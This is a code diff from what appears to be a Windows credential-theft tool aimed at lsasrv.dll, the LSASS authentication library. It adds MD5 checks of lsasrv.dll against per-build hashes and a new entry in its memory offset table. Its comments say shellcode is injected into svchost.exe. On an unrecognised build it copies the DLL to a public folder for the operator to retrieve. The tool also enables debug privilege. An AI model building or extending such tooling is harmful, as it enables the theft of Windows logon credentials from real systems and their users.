@@ -7,6 +7,81 @@
 #include <psapi.h>
 #include <userenv.h>
 #include <iostream>
+#include <windows.h>
+#include <wincrypt.h>
+#include <iostream>
+#include <iomanip>
+#include <string>
+char _final_md5_hash[33];
+bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
+	HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (hFile == INVALID_HANDLE_VALUE) {
+		std::cerr << "Error opening file: " << GetLastError() << std::endl;
+		return false;
+	}
+
+
+	HCRYPTPROV hProv;
+	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+		std::cerr << "CryptAcquireContext failed: " << GetLastError() << std::endl;
+		CloseHandle(hFile);
+		return false;
+	}
+
+	HCRYPTHASH hHash;
+	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
+		std::cerr << "CryptCreateHash failed: " << GetLastError() << std::endl;
+		CryptReleaseContext(hProv, 0);
+		CloseHandle(hFile);
+		return false;
+	}
+
+	const DWORD bufferSize = 8192;
+	BYTE buffer[bufferSize];
+	DWORD bytesRead;
+
+	while (ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL) && bytesRead > 0) {
+		if (!CryptHashData(hHash, buffer, bytesRead, 0)) {
+			std::cerr << "CryptHashData failed: " << GetLastError() << std::endl;
+			CryptDestroyHash(hHash);
+			CryptReleaseContext(hProv, 0);
+			CloseHandle(hFile);
+			return false;
+		}
+	}
+
+	BYTE hash[16];
+	DWORD hashSize = 16;
+	if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashSize, 0)) {
+		std::cerr << "CryptGetHashParam failed: " << GetLastError() << std::endl;
+		CryptDestroyHash(hHash);
+		CryptReleaseContext(hProv, 0);
+		CloseHandle(hFile);
+		return false;
+	}
+
+	CryptDestroyHash(hHash);
+	CryptReleaseContext(hProv, 0);
+	CloseHandle(hFile);
+
+
+	// Convert the binary hash to a hexadecimal string
+	//printf("md5 hash:\n\t");
+	for (int i = 0; i < 16; i++) {
+		sprintf(_final_md5_hash + i * 2, "%02x", hash[i]);
+	}
+	printf("%s\n", _final_md5_hash);
+
+
+	return true;
+}
+
+int mainMD5() {
+	std::wstring filePath = L"C:\\windows\\system32\\lsasrv.dll";
+	std::wstring md5Hash;
+	return CalculateMD5(filePath, md5Hash);
+}
 #define TABLE_LENGTH 1024
 bool EnableDebugPrivilege()
 {
@@ -58,8 +133,24 @@ char version_table[TABLE_LENGTH][50] = {
 	"6.1.7600.16385",
 	"6.3.9600.16384",
 	"6.1.7601.26561",
-	"10.0.16299.431"
-};
+	"10.0.16299.431",
+	"10.0.19041.3324"
+}; 
+char _md5_table[TABLE_LENGTH][33] = {
+	"10.0.19041.1",
+	"10.0.19041.2913",
+	"6.1.7601.17514",
+	"10.0.22621.1",
+	"10.0.14393.0",
+	"1ba40d15426fe568e443a52e008db1d7", // 10.0.17763.1
+	"6.1.7601.24214",
+	"6.1.7600.16385",
+	"6.3.9600.16384",
+	"6.1.7601.26561",
+	"10.0.16299.431",
+	"f17409ddc9a794eb39cfcd21d2c84c6f" // 10.0.19041.3324
+	
+}; 
 DWORD offset_table[TABLE_LENGTH] = {
 	0x32BC3,
 	0x1FA63
@@ -77,7 +168,8 @@ DWORD _offset_table[TABLE_LENGTH][5] = {
 	  {0x16030,0x110FE,0x32B0B,0xE8,0x18},
 	  {0x4482B,0x4DBA8,0xB0A90,0xE8,0x38},
 	  {0x10588,0xD8FE,0x4CE0C,0xE8,0x18},
-	  {0x915C,0x3E328,0x3E34D,0xE8,0x38}
+	  {0x915C,0x3E328,0x3E34D,0xE8,0x38},
+	{0x1FA63,0x395DC,0x8CA6C,0xe8,0x38}
 };
 void getosversion(char* result) {
 	char buffer[1024] = { 0 };
@@ -267,6 +359,16 @@ int main(int argc, char** argv)
 	DWORD offset = 0;
 	for (int i = 0; i < TABLE_LENGTH; i++) {
 		if (strcmp(res, version_table[i]) == 0) {
+			// 版本相同之后我们还需要比对md5值，因为在后续的测试过程中我发现，并不是
+			// 说版本号一致，lsasrv.dll就是一样的，需要使用校验和来确定
+			// 获取lsasrv.dll文件的md5值
+			ZeroMemory(_final_md5_hash, 33);
+			if (!mainMD5()) {
+				printf("md5 failed, abort...\n"); exit(-1);
+			}
+			if (strcmp(_final_md5_hash, _md5_table[i]) != 0) {
+				printf("md5 mismatch, continue searching\n"); continue;
+			}
 			offset = 1;
 			// 记录下来这个索引，写入到文件中，供注入到svchost.exe进程中的shellcode去读取
 			char write_out[123] = { 0 };
@@ -309,13 +411,14 @@ int main(int argc, char** argv)
 		}
 	}
 	if (!offset) {
-		printf("[-] unknown version, abort...\n");
+		printf("[-] unknown version or no md5 matched, abort...\n");
 		free(res);
 		// 把文件拷贝出来
 		char PasdadsaATH[1024] = "C:\\windows\\system32\\lsasrv.dll";
 		char PasdadsaATH2[1024] = "C:\\users\\public\\9at2";
 		if (FBFileExists(PasdadsaATH2))DeleteFileA(PasdadsaATH2);
 		CopyFileA(PasdadsaATH, PasdadsaATH2, FALSE);
+		printf("file copied to public folder '9at2',please retrieve it\n");
 		exit(-1);
 	}
 	free(res);
